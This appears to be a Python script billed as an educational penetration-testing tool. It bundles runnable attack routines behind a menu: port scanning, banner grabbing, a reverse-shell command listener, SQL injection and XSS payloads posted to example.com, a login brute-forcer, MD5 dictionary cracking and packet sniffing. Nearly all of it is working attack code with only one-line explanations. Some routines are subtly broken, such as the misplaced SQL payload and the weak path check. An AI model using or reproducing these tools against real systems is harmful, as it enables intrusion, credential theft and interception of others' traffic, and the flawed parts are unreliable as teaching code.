# Python Penetration Testing Educational Tool

import socket
import requests
import hashlib
import os
import scapy.all as scapy

def display_banner():
    print("""
                            ..         ..                        s                
            < .z@8"`       dF                         :8                
             !@88E        '88bu.                     .88                
     uL      '888E   u    '*88888bu         u       :888ooo       u     
 .ue888Nc..   888E u@8NL    ^"*8888N     us888u.  -*8888888    us888u.  
d88E`"888E`   888E`"88*"   beWE "888L .@88 "8888"   8888    .@88 "8888" 
888E  888E    888E .dN.    888E  888E 9888  9888    8888    9888  9888  
888E  888E    888E~8888    888E  888E 9888  9888    8888    9888  9888  
888E  888E    888E '888&   888E  888F 9888  9888   .8888Lu= 9888  9888  
888& .888E    888E  9888. .888N..888  9888  9888   ^%888*   9888  9888  
*888" 888&  '"888*" 4888"  `"888*""   "888*""888"    'Y"    "888*""888" 
 `"   "888E    ""    ""       ""       ^Y"   ^Y'             ^Y"   ^Y'  
.dWi   `88E                                                             
4888~  J8%                                                              
 ^"===*"`                                                               
          """)
    
    

challenges = [
    ("Port Scanner", "Scan for open ports on a target."),
    ("DNS Lookup", "Perform a DNS lookup for a domain."),
    ("Banner Grabbing", "Retrieve service banners from open ports."),
    ("Reverse Shell", "Create a reverse shell connection to a listener."),
    ("Directory Traversal", "Exploit directory traversal vulnerabilities."),
    ("SQL Injection", "Perform a basic SQL injection attack."),
    ("Cross-Site Scripting (XSS)", "Execute a basic XSS attack."),
    ("Brute Force Attack", "Attempt to brute force a login."),
    ("Hash Cracking", "Crack password hashes using a dictionary."),
    ("Network Sniffing", "Capture network traffic on a local network.")
]

def display_menu():
    print("\nWelcome to the Python Penetration Testing Educational Tool!")
    for i, (challenge, _) in enumerate(challenges, start=1):
        print(f"{i}. {challenge}")
    print(f"{len(challenges) + 1}. Exit")

def port_scanner():
    print("Challenge: Port Scanner")
    print("Description: " + challenges[0][1])
    
    target_host = input("Enter the target IP address or hostname: ")
    target_ports = input("Enter the target ports (comma-separated): ").split(',')
    
    open_ports = []
    for port in target_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_host, int(port)))
        if result == 0:
            open_ports.append(port)
        sock.close()

    if open_ports:
        print("Open ports:", ', '.join(open_ports))
    else:
        print("No open ports found.")
    
    print("Explanation: This challenge demonstrates how to perform a basic port scan using socket connections.")

def dns_lookup():
    print("Challenge: DNS Lookup")
    print("Description: " + challenges[1][1])
    
    domain = input("Enter the domain name: ")
    try:
        ip_address = socket.gethostbyname(domain)
        print(f"IP address of {domain}: {ip_address}")
    except socket.gaierror:
        print("DNS lookup failed. Unable to resolve the domain.")
    
    print("Explanation: This challenge illustrates how to perform DNS lookups to resolve domain names to IP addresses.")

def banner_grabbing():
    print("Challenge: Banner Grabbing")
    print("Description: " + challenges[2][1])
    
    target_host = input("Enter the target IP address or hostname: ")
    target_port = int(input("Enter the target port: "))
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_host, target_port))
        banner = sock.recv(1024)
        print("Service banner:", banner.decode().strip())
        sock.close()
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge shows how to connect to open ports and retrieve service banners to gather information about the services running.")

def reverse_shell():
    print("Challenge: Reverse Shell")
    print("Description: " + challenges[3][1])
    
    target_ip = input("Enter your IP address: ")
    target_port = int(input("Enter a port to listen on: "))
    
    try:
        listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_sock.bind((target_ip, target_port))
        listener_sock.listen(1)
        print(f"Listening on {target_ip}:{target_port}...")
        client_sock, client_addr = listener_sock.accept()
        print(f"Connection from: {client_addr[0]}:{client_addr[1]}")
        
        while True:
            command = input("$ ")
            client_sock.send(command.encode())
            if command.lower() == "exit":
                break
            response = client_sock.recv(4096).decode()
            print(response)
        
        client_sock.close()
        listener_sock.close()
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge demonstrates how to create a reverse shell connection to a listener, which can be used for remote access.")

def directory_traversal():
    print("Challenge: Directory Traversal")
    print("Description: " + challenges[4][1])
    
    base_dir = "/var/www/html/"
    file_path = input("Enter a file path: ")
    
    try:
        absolute_path = os.path.abspath(os.path.join(base_dir, file_path))
        if base_dir in absolute_path:
            with open(absolute_path, "r") as file:
                contents = file.read()
                print("File contents:\n", contents)
        else:
            print("Access denied.")
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge explores directory traversal vulnerabilities, where an attacker attempts to access files outside the intended directory.")

def sql_injection():
    print("Challenge: SQL Injection")
    print("Description: " + challenges[5][1])
    
    base_url = "https://example.com/"
    input_id = input("Enter an ID: ")
    payload = f"' OR '1'='1"
    url = f"{base_url}?id={input_id}&filter={payload}"
    
    try:
        response = requests.get(url)
        print("Response:", response.text)
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge involves performing a basic SQL injection attack to manipulate database queries.")

def xss_attack():
    print("Challenge: Cross-Site Scripting (XSS)")
    print("Description: " + challenges[6][1])
    
    base_url = "https://example.com/comment"
    payload = "<script>alert('XSS')</script>"
    data = {"comment": payload}
    
    try:
        response = requests.post(base_url, data=data)
        print("Response:", response.text)
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge demonstrates how to execute a basic Cross-Site Scripting (XSS) attack to inject malicious scripts into web pages.")

def brute_force():
    print("Challenge: Brute Force Attack")
    print("Description: " + challenges[7][1])
    
    target_url = "https://example.com/login"
    usernames = ["admin", "user"]
    password_file = "passwords.txt"
    
    try:
        with open(password_file, "r") as file:
            passwords = file.read().splitlines()
        
        for username in usernames:
            for password in passwords:
                data = {"username": username, "password": password}
                response = requests.post(target_url, data=data)
                if "Login successful" in response.text:
                    print(f"Found credentials: {username}:{password}")
                    return
        print("Brute force attack unsuccessful.")
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge simulates a brute force attack where an attacker tries various combinations of usernames and passwords to gain unauthorized access.")

def hash_cracking():
    print("Challenge: Hash Cracking")
    print("Description: " + challenges[8][1])
    
    password_hashes = ["5f4dcc3b5aa765d61d8327deb882cf99", "7c6a180b36896a0a8c02787eeafb0e4c"]
    dictionary_file = "dictionary.txt"
    
    try:
        with open(dictionary_file, "r") as file:
            dictionary = file.read().splitlines()
        
        for password in dictionary:
            for hash in password_hashes:
                if hash == hashlib.md5(password.encode()).hexdigest():
                    print(f"Found password: {password}")
                    return
        print("Password not found in dictionary.")
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge involves cracking password hashes using a dictionary of common passwords.")

def network_sniffing():
    print("Challenge: Network Sniffing")
    print("Description: " + challenges[9][1])
    
    target_interface = input("Enter the name of your network interface (e.g., eth0): ")
    
    try:
        print("Sniffing network traffic... Press Ctrl+C to stop.")
        scapy.sniff(iface=target_interface, store=False, prn=process_packet)
    except KeyboardInterrupt:
        print("\nStopped sniffing.")
    except Exception as e:
        print("Error:", str(e))
    
    print("Explanation: This challenge explores network sniffing techniques to capture and analyze network traffic on a local network.")

def process_packet(packet):
    print(packet.summary())  # Print a summary of the captured packet

def main():
    display_banner()
    while True:
        display_menu()
        choice = input("\nEnter your choice: ")
        
        if choice == str(len(challenges) + 1):
            print("Exiting the program. Goodbye!")
            break
        elif 1 <= int(choice) <= len(challenges):
            challenge_function = [
                port_scanner, dns_lookup, banner_grabbing, reverse_shell,
                directory_traversal, sql_injection, xss_attack, brute_force,
                hash_cracking, network_sniffing
            ][int(choice) - 1]
            print("\n------------------------------")
            print(f"Challenge: {challenges[int(choice) - 1][0]}")
            print(f"Description: {challenges[int(choice) - 1][1]}")
            print()
            challenge_function()
            print("------------------------------")
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
